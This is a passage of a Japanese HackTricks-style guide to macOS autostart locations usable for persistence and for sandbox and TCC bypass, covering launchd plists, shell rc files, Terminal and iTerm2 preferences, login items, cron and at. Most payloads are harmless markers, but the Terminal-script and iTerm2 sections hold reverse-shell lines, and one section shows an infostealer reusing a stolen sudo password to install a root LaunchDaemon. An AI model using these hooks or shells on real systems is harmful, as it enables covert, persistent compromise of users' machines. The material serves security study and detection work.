# macOS 自動起動

{{#include ../banners/hacktricks-training.md}}

このセクションはブログシリーズ [**Beyond the good ol' LaunchAgents**](https://theevilbit.github.io/beyond/) に強く基づいており、目的は **より多くの Autostart Locations** を追加（可能な場合）、最新の macOS (13.4) で **どの技術がまだ動作するか** を示し、必要な **permissions** を明示することです。

## Sandbox Bypass

> [!TIP]
> ここでは **sandbox bypass** に有用な起動場所を紹介します。これにより、単にファイルに書き込み、非常に一般的なアクション、所定の時間、または sandbox 内から通常実行できるアクションを待つだけで何かを実行できます（root 権限は不要です）。

### Launchd

- Useful to bypass sandbox: [✅](https://emojipedia.org/check-mark-button)
- TCC Bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Locations

- **`/Library/LaunchAgents`**
- **トリガー**: 再起動
- Root required
- **`/Library/LaunchDaemons`**
- **トリガー**: 再起動
- Root required
- **`/System/Library/LaunchAgents`**
- **トリガー**: 再起動
- Root required
- **`/System/Library/LaunchDaemons`**
- **トリガー**: 再起動
- Root required
- **`~/Library/LaunchAgents`**
- **トリガー**: 再ログイン
- **`~/Library/LaunchDemons`**
- **トリガー**: 再ログイン

> [!TIP]
> 興味深い事実として、**`launchd`** は Mach-o セクション `__Text.__config` に埋め込まれた property list を持ち、そこには launchd が起動すべき他のよく知られたサービスが含まれています。さらに、これらのサービスは `RequireSuccess`, `RequireRun` および `RebootOnSuccess` を含むことがあり、これはそれらが実行され正常に完了しなければならないことを意味します。
>
> もちろん、code signing のため変更できません。

#### Description & Exploitation

**`launchd`** は起動時に OS X カーネルによって実行される最初のプロセスであり、シャットダウン時に最後に終了するプロセスです。常に **PID 1** を持ちます。このプロセスは以下の **ASEP** の **plists** に示された設定を**読み取り実行**します:

- `/Library/LaunchAgents`: 管理者によってインストールされたユーザー単位のエージェント
- `/Library/LaunchDaemons`: 管理者によってインストールされたシステム全体のデーモン
- `/System/Library/LaunchAgents`: Apple が提供するユーザー単位のエージェント
- `/System/Library/LaunchDaemons`: Apple が提供するシステム全体のデーモン

ユーザーがログインすると、`/Users/$USER/Library/LaunchAgents` および `/Users/$USER/Library/LaunchDemons` にある plists はログイン中のユーザーの権限で起動されます。

エージェントとデーモンの主な違いは、エージェントはユーザーがログインしたときに読み込まれ、デーモンはシステム起動時に読み込まれる点です（ssh のようにユーザーがアクセスする前に実行される必要があるサービスがあるため）。また、エージェントは GUI を使用できる一方で、デーモンはバックグラウンドで動作する必要があります。
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.apple.someidentifier</string>
<key>ProgramArguments</key>
<array>
<string>bash -c 'touch /tmp/launched'</string> <!--Prog to execute-->
</array>
<key>RunAtLoad</key><true/> <!--Execute at system startup-->
<key>StartInterval</key>
<integer>800</integer> <!--Execute each 800s-->
<key>KeepAlive</key>
<dict>
<key>SuccessfulExit</key></false> <!--Re-execute if exit unsuccessful-->
<!--If previous is true, then re-execute in successful exit-->
</dict>
</dict>
</plist>
```
ユーザがログインする前に**agentを実行する必要がある**ケースがあり、これを**PreLoginAgents**と呼びます。例えば、ログイン時に支援技術を提供するのに有用です。`/Library/LaunchAgents`にも見つかります（例は[**here**](https://github.com/HelmutJ/CocoaSampleCode/tree/master/PreLoginAgents)を参照）。

> [!TIP]
> 新しい Daemons や Agents の設定ファイルは**次回再起動後に、または** `launchctl load <target.plist>` **を使って読み込まれます**。拡張子なしの .plist ファイルは `launchctl -F <file>` で読み込むことも可能です（ただしそれらの plist ファイルは再起動後に自動で読み込まれません）。\
> また `launchctl unload <target.plist>` で**unload**することも可能です（指定されたプロセスは終了します）。
>
> Agent や Daemon の実行を妨げる何か（override のようなもの）がないことを**確認する**には、次を実行してください: `sudo launchctl load -w /System/Library/LaunchDaemos/com.apple.smdb.plist`

現在のユーザが読み込んでいるすべての agents と daemons を一覧表示:
```bash
launchctl list
```
#### 例: 悪意のある LaunchDaemon チェーン (password reuse)

最近の macOS infostealer は、**captured sudo password** を再利用して、ユーザーエージェントと root LaunchDaemon を配置しました:

- エージェントのループを `~/.agent` に書き込み、実行可能にする。
- そのエージェントを指す plist を `/tmp/starter` に生成する。
- 盗まれたパスワードを `sudo -S` と共に再利用して `/Library/LaunchDaemons/com.finder.helper.plist` にコピーし、`root:wheel` を設定して `launchctl load` でロードする。
- 出力を切り離すために `nohup ~/.agent >/dev/null 2>&1 &` を使ってエージェントをサイレントに起動する。
```bash
printf '%s\n' "$pw" | sudo -S cp /tmp/starter /Library/LaunchDaemons/com.finder.helper.plist
printf '%s\n' "$pw" | sudo -S chown root:wheel /Library/LaunchDaemons/com.finder.helper.plist
printf '%s\n' "$pw" | sudo -S launchctl load /Library/LaunchDaemons/com.finder.helper.plist
nohup "$HOME/.agent" >/dev/null 2>&1 &
```
> [!WARNING]
> plistがユーザー所有であれば、たとえdaemonのシステム全体のフォルダ内にあっても、**タスクはrootではなくそのユーザーとして実行される**。これは一部の権限昇格攻撃を防ぐ可能性がある。

#### launchdに関する詳細

**`launchd`**はカーネルから起動される最初のユーザーモードプロセスです。プロセスの開始は**必ず成功**しなければならず、**終了やクラッシュが許されません**。さらに一部の**killシグナル**からも保護されています。

`launchd`が最初に行うことの一つは、次のような**daemons**をすべて**起動する**ことです:

- **Timer daemons**（時間ベースで実行される）:
- atd (`com.apple.atrun.plist`): `StartInterval` が 30min
- crond (`com.apple.systemstats.daily.plist`): `StartCalendarInterval` で 00:15 に開始
- **Network daemons** の例:
- `org.cups.cups-lpd`: TCPでリッスン（`SockType: stream`）し、`SockServiceName: printer`
- SockServiceName はポートか `/etc/services` のサービス名でなければなりません
- `com.apple.xscertd.plist`: TCPのポート1640でリッスン
- **Path daemons**（指定したパスが変更されたときに実行される）:
- `com.apple.postfix.master`: `/etc/postfix/aliases` パスを監視
- **IOKit notifications daemons**:
- `com.apple.xartstorageremoted`: `"com.apple.iokit.matching" => { "com.apple.device-attach" => { "IOMatchLaunchStream" => 1 ...`
- **Mach port:**
- `com.apple.xscertd-helper.plist`: `MachServices` エントリに `com.apple.xscertd.helper` という名前を示している
- **UserEventAgent:**
- これは前述のものとは異なります。特定のイベントに応じて launchd によってアプリを起動させます。ただし、この場合の主要バイナリは `launchd` ではなく `/usr/libexec/UserEventAgent` です。プラグインは SIP 制限されたフォルダ `/System/Library/UserEventPlugins/` からロードされ、各プラグインは `XPCEventModuleInitializer` キーで初期化子を示すか、古いプラグインでは `Info.plist` の `CFPluginFactories` 辞書内のキー `FB86416D-6164-2070-726F-70735C216EC0` の下で示します。

### shell startup files

Writeup: [https://theevilbit.github.io/beyond/beyond_0001/](https://theevilbit.github.io/beyond/beyond_0001/)\
Writeup (xterm): [https://theevilbit.github.io/beyond/beyond_0018/](https://theevilbit.github.io/beyond/beyond_0018/)

- サンドボックス回避に有用: [✅](https://emojipedia.org/check-mark-button)
- TCC Bypass: [✅](https://emojipedia.org/check-mark-button)
- ただし、これらのファイルをロードするシェルを実行するTCCバイパスを持つアプリを見つける必要がある

#### Locations

- **`~/.zshrc`, `~/.zlogin`, `~/.zshenv.zwc`**, **`~/.zshenv`, `~/.zprofile`**
- **Trigger**: zshでターミナルを開く
- **`/etc/zshenv`, `/etc/zprofile`, `/etc/zshrc`, `/etc/zlogin`**
- **Trigger**: zshでターミナルを開く（root権限が必要）
- **`~/.zlogout`**
- **Trigger**: zshのターミナルを終了する
- **`/etc/zlogout`**
- **Trigger**: zshのターミナルを終了する（root権限が必要）
- 詳細は: **`man zsh`**
- **`~/.bashrc`**
- **Trigger**: bashでターミナルを開く
- `/etc/profile`（動作しなかった）
- `~/.profile`（動作しなかった）
- `~/.xinitrc`, `~/.xserverrc`, `/opt/X11/etc/X11/xinit/xinitrc.d/`
- **Trigger**: xtermでトリガーされることが想定されるが、xtermは**インストールされておらず**、インストール後も次のエラーが発生する: xterm: `DISPLAY is not set`

#### Description & Exploitation

`zsh` や `bash` といったシェル環境を起動する際に、**特定の起動ファイルが実行されます**。macOSは現在デフォルトシェルとして `/bin/zsh` を使用しています。このシェルは Terminal アプリを起動したときや SSH 経由でデバイスにアクセスしたときに自動的に使われます。`bash` や `sh` も macOS に存在しますが、明示的に呼び出す必要があります。

`zsh` の man ページ（`man zsh` で読める）は、起動ファイルに関する長い説明を含んでいます。
```bash
# Example executino via ~/.zshrc
echo "touch /tmp/hacktricks" >> ~/.zshrc
```
### 再オープンされるアプリケーション

> [!CAUTION]
> 記載された exploitation の設定やログアウト／ログイン、あるいは再起動を行っても、私の環境ではアプリが実行されませんでした。（アプリが実行されていなかったためかもしれません。これらの操作を行う際にアプリが既に起動している必要があるのかもしれません）

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0021/](https://theevilbit.github.io/beyond/beyond_0021/)

- Useful to bypass sandbox: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### 場所

- **`~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist`**
- **Trigger**: Restart reopening applications

#### 説明 & Exploitation

再度開かれるすべてのアプリケーションは plist `~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist` の中にあります。

つまり、再オープンされるアプリケーションを自分のアプリにさせるには、単に**アプリをリストに追加する**だけです。

UUID はそのディレクトリを一覧表示するか、`ioreg -rd1 -c IOPlatformExpertDevice | awk -F'"' '/IOPlatformUUID/{print $4}'` で見つけられます。

再オープンされるアプリケーションを確認するには次を実行できます:
```bash
defaults -currentHost read com.apple.loginwindow TALAppsToRelaunchAtLogin
#or
plutil -p ~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist
```
このリストに**アプリケーションを追加する**には、次を使用できます:
```bash
# Adding iTerm2
/usr/libexec/PlistBuddy -c "Add :TALAppsToRelaunchAtLogin: dict" \
-c "Set :TALAppsToRelaunchAtLogin:$:BackgroundState 2" \
-c "Set :TALAppsToRelaunchAtLogin:$:BundleID com.googlecode.iterm2" \
-c "Set :TALAppsToRelaunchAtLogin:$:Hide 0" \
-c "Set :TALAppsToRelaunchAtLogin:$:Path /Applications/iTerm.app" \
~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist
```
### Terminal の設定

- サンドボックス回避に有用: [✅](https://emojipedia.org/check-mark-button)
- TCCバイパス: [✅](https://emojipedia.org/check-mark-button)
- Terminalは、使用するユーザーのFDA権限を持つことがある

#### 場所

- **`~/Library/Preferences/com.apple.Terminal.plist`**
- **トリガー**: Terminalを開く

#### 説明と悪用

**`~/Library/Preferences`** にはアプリケーションのユーザー設定が保存されています。これらの設定の一部は、他のアプリケーションやスクリプトを**実行する設定**を含むことがあります。

例えば、Terminalは起動時にコマンドを実行できます:

<figure><img src="../images/image (1148).png" alt="" width="495"><figcaption></figcaption></figure>

この設定はファイル **`~/Library/Preferences/com.apple.Terminal.plist`** に次のように反映されます:
```bash
[...]
"Window Settings" => {
"Basic" => {
"CommandString" => "touch /tmp/terminal_pwn"
"Font" => {length = 267, bytes = 0x62706c69 73743030 d4010203 04050607 ... 00000000 000000cf }
"FontAntialias" => 1
"FontWidthSpacing" => 1.004032258064516
"name" => "Basic"
"ProfileCurrentVersion" => 2.07
"RunCommandAsShell" => 0
"type" => "Window Settings"
}
[...]
```
つまり、システム内の terminal の設定 plist が上書き可能であれば、**`open`** 機能を使って terminal を開き、そのコマンドを実行させることができます。

You can add this from the cli with:
```bash
# Add
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"CommandString\" 'touch /tmp/terminal-start-command'" $HOME/Library/Preferences/com.apple.Terminal.plist
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"RunCommandAsShell\" 0" $HOME/Library/Preferences/com.apple.Terminal.plist

# Remove
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"CommandString\" ''" $HOME/Library/Preferences/com.apple.Terminal.plist
```
### Terminalスクリプト / その他のファイル拡張子

- sandbox回避に有用: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- Terminalはユーザーの権限（例: TCC）を利用できるため、有効

#### Location

- **Anywhere**
- **Trigger**: Open Terminal

#### Description & Exploitation

もし[**`.terminal`**スクリプト](https://stackoverflow.com/questions/32086004/how-to-use-the-default-terminal-settings-when-opening-a-terminal-file-osx)を作成して開くと、**Terminal application**が自動的に起動してそこに記載されたコマンドを実行します。Terminalアプリが特別な権限（例えばTCC）を持っている場合、あなたのコマンドはその特権で実行されます。

Try it with:
```bash
# Prepare the payload
cat > /tmp/test.terminal << EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CommandString</key>
<string>mkdir /tmp/Documents; cp -r ~/Documents /tmp/Documents;</string>
<key>ProfileCurrentVersion</key>
<real>2.0600000000000001</real>
<key>RunCommandAsShell</key>
<false/>
<key>name</key>
<string>exploit</string>
<key>type</key>
<string>Window Settings</string>
</dict>
</plist>
EOF

# Trigger it
open /tmp/test.terminal

# Use something like the following for a reverse shell:
<string>echo -n "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvNDQ0NCAwPiYxOw==" | base64 -d | bash;</string>
```
You could also use the extensions **`.command`**, **`.tool`**, with regular shell scripts content and they will be also opened by Terminal.

> [!CAUTION]
> If terminal has **Full Disk Access** it will be able to complete that action (note that the command executed will be visible in a terminal window).

### Audio Plugins

Writeup: [https://theevilbit.github.io/beyond/beyond_0013/](https://theevilbit.github.io/beyond/beyond_0013/)\
Writeup: [https://posts.specterops.io/audio-unit-plug-ins-896d3434a882](https://posts.specterops.io/audio-unit-plug-ins-896d3434a882)

- サンドボックス回避に有用: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [🟠](https://emojipedia.org/large-orange-circle)
- 追加のTCCアクセスを得られる場合があります

#### 場所

- **`/Library/Audio/Plug-Ins/HAL`**
- root権限が必要
- **Trigger**: Restart coreaudiod or the computer
- **`/Library/Audio/Plug-ins/Components`**
- root権限が必要
- **Trigger**: Restart coreaudiod or the computer
- **`~/Library/Audio/Plug-ins/Components`**
- **Trigger**: Restart coreaudiod or the computer
- **`/System/Library/Components`**
- root権限が必要
- **Trigger**: Restart coreaudiod or the computer

#### 説明

前述の writeups によれば、**オーディオプラグインをコンパイルして**ロードさせることが可能です。

### QuickLook Plugins

Writeup: [https://theevilbit.github.io/beyond/beyond_0028/](https://theevilbit.github.io/beyond/beyond_0028/)

- サンドボックス回避に有用: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [🟠](https://emojipedia.org/large-orange-circle)
- 追加のTCCアクセスを得られる場合があります

#### 場所

- `/System/Library/QuickLook`
- `/Library/QuickLook`
- `~/Library/QuickLook`
- `/Applications/AppNameHere/Contents/Library/QuickLook/`
- `~/Applications/AppNameHere/Contents/Library/QuickLook/`

#### 説明と悪用

QuickLook プラグインは、ファイルのプレビューを**トリガーしたとき**（Finderでファイルを選択してスペースバーを押す）に、当該ファイルタイプをサポートする**プラグインがインストールされていれば**実行されます。

自分の QuickLook プラグインをコンパイルして、前述のいずれかの場所に配置するとロードされ、対応するファイルでスペースを押すことでトリガーできます。

### ~~ログイン/ログアウトフック~~

> [!CAUTION]
> This didn't work for me, neither with the user LoginHook nor with the root LogoutHook

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0022/](https://theevilbit.github.io/beyond/beyond_0022/)

- サンドボックス回避に有用: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### 場所

- 次のようなコマンドを実行できる必要があります: `defaults write com.apple.loginwindow LoginHook /Users/$USER/hook.sh`
- `Lo`cated in `~/Library/Preferences/com.apple.loginwindow.plist`

これらは非推奨ですが、ユーザーがログインしたときにコマンドを実行するために使えます。
```bash
cat > $HOME/hook.sh << EOF
#!/bin/bash
echo 'My is: \`id\`' > /tmp/login_id.txt
EOF
chmod +x $HOME/hook.sh
defaults write com.apple.loginwindow LoginHook /Users/$USER/hook.sh
defaults write com.apple.loginwindow LogoutHook /Users/$USER/hook.sh
```
この設定は `/Users/$USER/Library/Preferences/com.apple.loginwindow.plist` に保存されています。
```bash
defaults read /Users/$USER/Library/Preferences/com.apple.loginwindow.plist
{
LoginHook = "/Users/username/hook.sh";
LogoutHook = "/Users/username/hook.sh";
MiniBuddyLaunch = 0;
TALLogoutReason = "Shut Down";
TALLogoutSavesState = 0;
oneTimeSSMigrationComplete = 1;
}
```
削除するには:
```bash
defaults delete com.apple.loginwindow LoginHook
defaults delete com.apple.loginwindow LogoutHook
```
root ユーザーのものは **`/private/var/root/Library/Preferences/com.apple.loginwindow.plist`** に格納されています

## 条件付き Sandbox Bypass

> [!TIP]
> ここでは、**sandbox bypass** に便利な開始場所を示します。これは、**ファイルに書き込むこと** によって単に何かを実行し、特定の **プログラムのインストール、"あまり一般的でない" ユーザー** の操作や環境など、あまり一般的でない条件を期待することで実行できる手法です。

### Cron

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0004/](https://theevilbit.github.io/beyond/beyond_0004/)

- sandbox bypass に有用: [✅](https://emojipedia.org/check-mark-button)
- ただし、`crontab` バイナリを実行できる必要があります
- または root であること
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Location

- **`/usr/lib/cron/tabs/`, `/private/var/at/tabs`, `/private/var/at/jobs`, `/etc/periodic/`**
- 直接書き込みアクセスには root が必要です。`crontab <file>` を実行できる場合は root は不要です
- **Trigger**: cron ジョブに依存

#### 説明 & Exploitation

次のコマンドで**現在のユーザー**の cron ジョブを列挙します：
```bash
crontab -l
```
ユーザーのcron jobsは、**`/usr/lib/cron/tabs/`** と **`/var/at/tabs/`** で確認できます（root権限が必要）。

MacOSでは、スクリプトを**一定の頻度で**実行するいくつかのフォルダが次の場所にあります：
```bash
# The one with the cron jobs is /usr/lib/cron/tabs/
ls -lR /usr/lib/cron/tabs/ /private/var/at/jobs /etc/periodic/
```
そこでは通常の **cron** **jobs**、**at** **jobs**（あまり使われない）、および **periodic** **jobs**（主に一時ファイルのクリーンアップに使用）を確認できます。日次の **periodic** **jobs** は例えば: `periodic daily` で実行できます。

ユーザーの **user cronjob programatically** を追加するには、次の方法が使えます:
```bash
echo '* * * * * /bin/bash -c "touch /tmp/cron3"' > /tmp/cron
crontab /tmp/cron
```
### iTerm2

解説: [https://theevilbit.github.io/beyond/beyond_0002/](https://theevilbit.github.io/beyond/beyond_0002/)

- sandbox をバイパスするのに有用: [✅](https://emojipedia.org/check-mark-button)
- TCC バイパス: [✅](https://emojipedia.org/check-mark-button)
- iTerm2 はかつて TCC の権限が付与されていた

#### 場所

- **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch`**
- **トリガー**: iTerm を開く
- **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch.scpt`**
- **トリガー**: iTerm を開く
- **`~/Library/Preferences/com.googlecode.iterm2.plist`**
- **トリガー**: iTerm を開く

#### 説明と悪用

**`~/Library/Application Support/iTerm2/Scripts/AutoLaunch`** に保存されたスクリプトは実行されます。例えば：
```bash
cat > "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.sh" << EOF
#!/bin/bash
touch /tmp/iterm2-autolaunch
EOF

chmod +x "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.sh"
```
または:
```bash
cat > "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.py" << EOF
#!/usr/bin/env python3
import iterm2,socket,subprocess,os

async def main(connection):
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('10.10.10.10',4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['zsh','-i']);
async with iterm2.CustomControlSequenceMonitor(
connection, "shared-secret", r'^create-window$') as mon:
while True:
match = await mon.async_get()
await iterm2.Window.async_create(connection)

iterm2.run_forever(main)
EOF
```
スクリプト **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch.scpt`** も実行されます:
```bash
do shell script "touch /tmp/iterm2-autolaunchscpt"
```
iTerm2 の環境設定ファイル **`~/Library/Preferences/com.googlecode.iterm2.plist`** は、iTerm2 ターミナルが開かれたときに**実行するコマンドを示す**ことがあります。

この設定は iTerm2 の設定で構成できます:

<figure><img src="../images/image (37).png" alt="" width="563"><figcaption></figcaption></figure>

そして、そのコマンドは環境設定に反映されます:
```bash
plutil -p com.googlecode.iterm2.plist
{
[...]
"New Bookmarks" => [
0 => {
[...]
"Initial Text" => "touch /tmp/iterm-start-command"
```
実行するコマンドは次のように設定できます:
```bash
# Add
/usr/libexec/PlistBuddy -c "Set :\"New Bookmarks\":0:\"Initial Text\" 'touch /tmp/iterm-start-command'" $HOME/Library/Preferences/com.googlecode.iterm2.plist

# Call iTerm
open /Applications/iTerm.app/Contents/MacOS/iTerm2

# Remove
/usr/libexec/PlistBuddy -c "Set :\"New Bookmarks\":0:\"Initial Text\" ''" $HOME/Library/Preferences/com.googlecode.iterm2.plist
```
> [!WARNING]
> 非常に高い確率で **other ways to abuse the iTerm2 preferences** が存在し、任意のコマンドを実行できます。

### xbar

Writeup: [https://theevilbit.github.io/beyond/beyond_0007/](https://theevilbit.github.io/beyond/beyond_0007/)

- sandbox をバイパスするのに有用: [✅](https://emojipedia.org/check-mark-button)
- ただし xbar がインストールされている必要がある
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- Accessibility permissions を要求する

#### Location

- **`~/Library/Application\ Support/xbar/plugins/`**
- **Trigger**: xbar が起動されたとき

#### Description

人気のあるプログラム [**xbar**](https://github.com/matryer/xbar) がインストールされている場合、**`~/Library/Application\ Support/xbar/plugins/`** にシェルスクリプトを書いておくことで、xbar 起動時にそのスクリプトが実行されます:
```bash
cat > "$HOME/Library/Application Support/xbar/plugins/a.sh" << EOF
#!/bin/bash
touch /tmp/xbar
EOF
chmod +x "$HOME/Library/Application Support/xbar/plugins/a.sh"
```
### Hammerspoon

**解説**: [https://theevilbit.github.io/beyond/beyond_0008/](https://theevilbit.github.io/beyond/beyond_0008/)

- sandbox をバイパスするのに有用: [✅](https://emojipedia.org/check-mark-button)
- ただし Hammerspoon がインストールされている必要がある
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- アクセシビリティ権限を要求する

#### 場所

- **`~/.hammerspoon/init.lua`**
- **トリガー**: hammerspoon が実行されたとき

#### 説明

[**Hammerspoon**](https://github.com/Hammerspoon/hammerspoon) は **macOS** 向けの自動化プラットフォームで、**LUA スクリプト言語** を利用して動作します。完全な AppleScript コードの統合やシェルスクリプトの実行をサポートしており、スクリプト機能を大幅に拡張します。

アプリは単一のファイル `~/.hammerspoon/init.lua` を参照し、起動時にそのスクリプトが実行されます。
```bash
mkdir -p "$HOME/.hammerspoon"
cat > "$HOME/.hammerspoon/init.lua" << EOF
hs.execute("/Applications/iTerm.app/Contents/MacOS/iTerm2")
EOF
```
### BetterTouchTool

- サンドボックスを回避するのに有用: [✅](https://emojipedia.org/check-mark-button)
- ただし BetterTouchTool がインストールされている必要がある
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- Automation-Shortcuts と Accessibility の権限を要求する

#### Location

- `~/Library/Application Support/BetterTouchTool/*`

このツールは、特定のショートカットが押されたときに実行するアプリケーションやスクリプトを指定できる。攻撃者はデータベースに自分の **ショートカットと実行するアクション** を設定し、任意のコードを実行させることが可能かもしれない（ショートカットは単にキーを押すことでもよい）。

### Alfred

- サンドボックスを回避するのに有用: [✅](https://emojipedia.org/check-mark-button)
- ただし Alfred がインストールされている必要がある
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- Automation、Accessibility、さらには Full-Disk access の権限を要求する

#### Location

- `???`

特定の条件が満たされたときにコードを実行するワークフローを作成できる。攻撃者がワークフローファイルを作成して Alfred に読み込ませることが可能かもしれない（ワークフローを使うにはプレミアム版の購入が必要）。

### SSHRC

Writeup: [https://theevilbit.github.io/beyond/beyond_0006/](https://theevilbit.github.io/beyond/beyond_0006/)

- サンドボックスを回避するのに有用: [✅](https://emojipedia.org/check-mark-button)
- ただし ssh を有効にして使用する必要がある
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- SSH はかつて FDA access を持っていた

#### Location

- **`~/.ssh/rc`**
- **Trigger:** ssh 経由でのログイン
- **`/etc/ssh/sshrc`**
- Root 権限が必要
- **Trigger:** ssh 経由でのログイン

> [!CAUTION]
> ssh を有効にするには Full Disk Access が必要：
>
> ```bash
> sudo systemsetup -setremotelogin on
> ```

#### 説明と悪用

デフォルトでは、`/etc/ssh/sshd_config` に `PermitUserRC no` が設定されていない限り、ユーザが **SSH 経由でログイン** するとスクリプト **`/etc/ssh/sshrc`** と **`~/.ssh/rc`** が実行される。

### **Login Items**

Writeup: [https://theevilbit.github.io/beyond/beyond_0003/](https://theevilbit.github.io/beyond/beyond_0003/)

- サンドボックスを回避するのに有用: [✅](https://emojipedia.org/check-mark-button)
- ただし引数付きで `osascript` を実行する必要がある
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Locations

- **`~/Library/Application Support/com.apple.backgroundtaskmanagementagent`**
- **Trigger:** ログイン
- 悪用用のペイロードは `osascript` を呼び出す形で保存される
- **`/var/db/com.apple.xpc.launchd/loginitems.501.plist`**
- **Trigger:** ログイン
- Root 権限が必要

#### Description

System Preferences -> Users & Groups -> **Login Items** には、**ユーザがログインしたときに実行される項目** がある。\
コマンドラインからそれらを一覧表示、追加、削除することが可能だ：
```bash
#List all items:
osascript -e 'tell application "System Events" to get the name of every login item'

#Add an item:
osascript -e 'tell application "System Events" to make login item at end with properties {path:"/path/to/itemname", hidden:false}'

#Remove an item:
osascript -e 'tell application "System Events" to delete login item "itemname"'
```
These items are stored in the file **`~/Library/Application Support/com.apple.backgroundtaskmanagementagent`**

**ログイン項目**は API [SMLoginItemSetEnabled](https://developer.apple.com/documentation/servicemanagement/1501557-smloginitemsetenabled?language=objc) を使って示されることもあり、その設定は **`/var/db/com.apple.xpc.launchd/loginitems.501.plist`** に保存されます。

### ZIP をログイン項目として

(前節のログイン項目を参照、これは拡張です)

ZIP ファイルを **ログイン項目** として保存すると、**`Archive Utility`** がそれを展開します。例えば ZIP が **`~/Library`** に保存され、フォルダ **`LaunchAgents/file.plist`** が含まれており、その中に backdoor がある場合、そのフォルダは作成され（デフォルトでは作成されません）、plist が追加されるため、次回ユーザがログインしたときに **plist に示された backdoor が実行されます**。

別の方法として、ユーザの HOME 内に **`.bash_profile`** と **`.zshenv`** を作成しておくことで、もし LaunchAgents フォルダが既に存在していてもこの手法は機能します。

### At

Writeup: [https://theevilbit.github.io/beyond/beyond_0014/](https://theevilbit.github.io/beyond/beyond_0014/)

- sandbox を回避するのに有用: [✅](https://emojipedia.org/check-mark-button)
- ただし **`at`** を実行でき、かつ有効になっている必要があります
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### 場所

- **`at`** を実行でき、かつ有効になっている必要があります

#### **説明**

`at` タスクは特定の時間に実行される単発のタスクをスケジュールするために設計されています。cron ジョブとは異なり、`at` タスクは実行後に自動的に削除されます。これらのタスクはシステムの再起動後も持続する点に注意が必要で、特定の条件下ではセキュリティ上の懸念となり得ます。

デフォルトでは無効になっていますが、**root** ユーザは次のコマンドで有効にできます：
```bash
sudo launchctl load -F /System/Library/LaunchDaemons/com.apple.atrun.plist
```
これにより1時間後にファイルが作成されます:
```bash
echo "echo 11 > /tmp/at.txt" | at now+1
```
ジョブキューを `atq:` で確認します。
```shell-session
sh-3.2# atq
26	Tue Apr 27 00:46:00 2021
22	Wed Apr 28 00:29:00 2021
```
上には2つのジョブがスケジュールされているのが見えます。`at -c JOBNUMBER` を使ってジョブの詳細を表示できます。
```shell-session
sh-3.2# at -c 26
#!/bin/sh
# atrun uid=0 gid=0
# mail csaby 0
umask 22
SHELL=/bin/sh; export SHELL
TERM=xterm-256color; export TERM
USER=root; export USER
SUDO_USER=csaby; export SUDO_USER
SUDO_UID=501; export SUDO_UID
SSH_AUTH_SOCK=/private/tmp/com.apple.launchd.co51iLHIjf/Listeners; export SSH_AUTH_SOCK
__CF_USER_TEXT_ENCODING=0x0:0:0; export __CF_USER_TEXT_ENCODING
MAIL=/var/mail/root; export MAIL
PATH=/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin; export PATH
PWD=/Users/csaby; export PWD
SHLVL=1; export SHLVL
SUDO_COMMAND=/usr/bin/su; export SUDO_COMMAND
HOME=/var/root; export HOME
LOGNAME=root; export LOGNAME
LC_CTYPE=UTF-8; export LC_CTYPE
SUDO_GID=20; export SUDO_GID
_=/usr/bin/at; export _
cd /Users/csaby || {
echo 'Execution directory inaccessible' >&2
exit 1
}
unset OLDPWD
echo 11 > /tmp/at.txt
```
> [!WARNING]
> AT tasks が有効になっていない場合、作成された tasks は実行されません。

これらの **job files** は `/private/var/at/jobs/` にあります。
```
sh-3.2# ls -l /private/var/at/jobs/
total 32
-rw-r--r--  1 root  wheel    6 Apr 27 00:46 .SEQ
-rw-------  1 root  wheel    0 Apr 26 23:17 .lockfile
-r--------  1 root  wheel  803 Apr 27 00:46 a00019019bdcd2
-rwx------  1 root  wheel  803 Apr 27 00:46 a0001a019bdcd2
```
ファイル名にはキュー、ジョブ番号、そして実行予定時刻が含まれます。例えば `a0001a019bdcd2` を見てみましょう。

- `a` - これはキューです
- `0001a` - ジョブ番号（16進数）、`0x1a = 26`
